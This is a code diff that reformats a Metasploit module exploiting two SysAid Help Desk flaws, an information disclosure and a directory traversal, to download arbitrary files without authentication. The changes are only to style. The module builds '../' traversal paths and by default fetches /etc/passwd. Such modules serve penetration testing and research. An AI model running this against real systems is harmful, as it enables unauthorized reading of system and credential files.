@@ -7,41 +7,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'SysAid Help Desk Arbitrary File Download',
-      'Description' => %q{
-        This module exploits two vulnerabilities in SysAid Help Desk that allows
-        an unauthenticated user to download arbitrary files from the system. First, an
-        information disclosure vulnerability (CVE-2015-2997) is used to obtain the file
-        system path, and then we abuse a directory traversal (CVE-2015-2996) to download
-        the file. Note that there are some limitations on Windows, in that the information
-        disclosure vulnerability doesn't work on a Windows platform, and we can only
-        traverse the current drive (if you enter C:\afile.txt and the server is running
-        on D:\ the file will not be downloaded).
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'SysAid Help Desk Arbitrary File Download',
+        'Description' => %q{
+          This module exploits two vulnerabilities in SysAid Help Desk that allows
+          an unauthenticated user to download arbitrary files from the system. First, an
+          information disclosure vulnerability (CVE-2015-2997) is used to obtain the file
+          system path, and then we abuse a directory traversal (CVE-2015-2996) to download
+          the file. Note that there are some limitations on Windows, in that the information
+          disclosure vulnerability doesn't work on a Windows platform, and we can only
+          traverse the current drive (if you enter C:\afile.txt and the server is running
+          on D:\ the file will not be downloaded).
 
-        This module has been tested with SysAid 14.4 on Windows and Linux.
+          This module has been tested with SysAid 14.4 on Windows and Linux.
         },
-      'Author' =>
-        [
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
         ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2015-2996'],
           ['CVE', '2015-2997'],
           ['URL', 'https://seclists.org/fulldisclosure/2015/Jun/8'],
           ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt'],
         ],
-      'DisclosureDate' => '2015-06-03'))
+        'DisclosureDate' => '2015-06-03'
+      )
+    )
 
     register_options(
       [
         OptPort.new('RPORT', [true, 'The target port', 8080]),
-        OptString.new('TARGETURI', [ true,  "SysAid path", '/sysaid']),
+        OptString.new('TARGETURI', [ true, "SysAid path", '/sysaid']),
         OptString.new('FILEPATH', [false, 'Path of the file to download (escape Windows paths with a back slash)', '/etc/passwd']),
-      ])
+      ]
+    )
   end
 
   def get_traversal_path
@@ -107,13 +110,14 @@ class MetasploitModule < Msf::Auxiliary
       count = 1
       while count < 15
         res = download_file(('../' * count) + file_path)
-        if res && res.code == 200  && res.body.to_s.bytesize != 0
+        if res && res.code == 200 && res.body.to_s.bytesize != 0
           break
         end
+
         count += 1
       end
     else
-      res = download_file(traversal_path[0,traversal_path.length - 1] + file_path)
+      res = download_file(traversal_path[0, traversal_path.length - 1] + file_path)
     end
 
     if res && res.code == 200
